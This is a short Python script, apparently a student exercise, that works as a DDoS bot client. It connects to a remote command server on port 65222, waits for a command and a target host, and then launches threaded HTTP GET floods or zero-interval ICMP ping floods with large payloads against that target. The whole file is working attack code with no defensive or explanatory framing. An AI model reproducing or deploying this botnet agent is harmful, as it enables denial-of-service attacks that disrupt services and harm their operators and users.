import os, requests, time, socket
from icmplib import ping
from threading import Thread

IP_address = os.environ['IP_address']
Port = 65222

def http_attack(host):
    s = requests.session()
    for i in range(10000):
        s.get(f"http://{host}") 

def icmp_attack(host):
    ping(host, count=1000, interval=0, timeout=0, 
                payload=('Le Thanh Trung - N18DCAT097'*1024).encode('UTF-8'))   

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.connect((IP_address, Port))

    while True:
        cmd = server.recv(1024).decode('UTF-8').strip()
        host = server.recv(1024).decode('UTF-8').strip()

        if cmd == '1':
            for i in range(10):
               Thread(target=http_attack, args=(host,)).run()           
        elif cmd == '2':
            for i in range(10):
               Thread(target=icmp_attack, args=(host,)).run()         

if __name__=="__main__":
    while True:
        time.sleep(10)
        main()
        
  